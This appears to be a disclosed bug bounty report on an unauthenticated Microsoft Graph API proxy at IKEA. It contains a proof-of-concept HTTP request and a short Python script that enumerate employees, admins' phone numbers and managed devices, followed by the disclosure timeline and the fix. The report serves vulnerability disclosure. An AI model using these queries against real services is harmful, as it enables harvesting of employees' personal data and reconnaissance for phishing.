# IKEA Bug Bounty: Microsoft Graph API Proxy Information Leakage

Target: [REDACTED].net
Severity: High (7.5)
Weakness: Broken Access Control / Insecure Proxy
Report ID: #[REDACTED]

## 1. Summary
The application [REDACTED].net contained an unauthenticated API proxy at /api/graph/*. This endpoint forwarded requests to the Microsoft Graph API using a high-privilege Service Principal. Because no session validation existed, an external attacker could dump IKEA's entire Active Directory, including employee PII and internal infrastructure metadata.

## 2. Discovery
Analysis of client-side JS revealed an API module named nextApi. It was configured to send raw OData queries to the backend:

```javascript
findGraphUsers: e.query({
    query: e => {
        let { search: n, filter: t, orderBy: r, select: i } = e;
        return {
            url: "/graph/beta/users",
            params: {
                $filter: t,
                $select: i
            }
        }
    }
})
```

The backend route /api/graph/* failed to check for cookies or authorization headers, allowing direct access from the public internet.

## 3. Proof of Concept
An attacker could retrieve administrator contact details with a single request:

```http
GET /api/graph/beta/users?$filter=startswith(jobTitle,'Admin')&$select=displayName,userPrincipalName,mobilePhone HTTP/1.1
Host: [REDACTED].net
```

Python automation for asset harvesting:

```python
import requests
TARGET = "https://[REDACTED].net/api/graph/v1.0/"
# Enumerating managed devices
res = requests.get(f"{TARGET}devices", params={"$select": "displayName,operatingSystem"})
print(res.json())
```

## 4. Impact
- Personal Data: Identification of Employees (including admins) and extraction of PII (e.g., +43 664...).
- Infrastructure Recon: Enumeration of internal Azure AD applications, App IDs, and secret hints.
- Device Visibility: Listing of managed iPads and Android devices including OS versions.
- Social Engineering: Ability to map organization charts via the /directReports endpoint to facilitate spear-phishing.

## 5. HackerOne Communication summary

2026-01-20: @[REDACTED] submitted the report.

2026-01-21: @h1_analyst_ren requested raw HTTP requests for validation.

2026-01-21: @[REDACTED] provided requests for user listing, IT assets, domains, and security groups.

2026-01-22: @sofkin (IKEA) triaged the report. Severity was adjusted to 8.4 (High). IKEA noted the scope was unchanged as no lateral movement was proven beyond the initial domain authority.

2026-01-27: @sofkin marked the issue as Resolved, confirming the patch was deployed.

2026-02-16: @sofkin confirmed the report is eligible for a reward under the High/Critical category.

## 6. Root Cause and Remediation
The vulnerability was caused by:
1. Missing authentication middleware on Next.js API routes.
2. Use of App-Only permissions (Service Principal) instead of Delegated (User-specific) permissions.
3. Pass-through of unsanitized OData parameters.

IKEA resolved the issue by enforcing session checks on all proxy routes and restricting the permissions of the application identity.
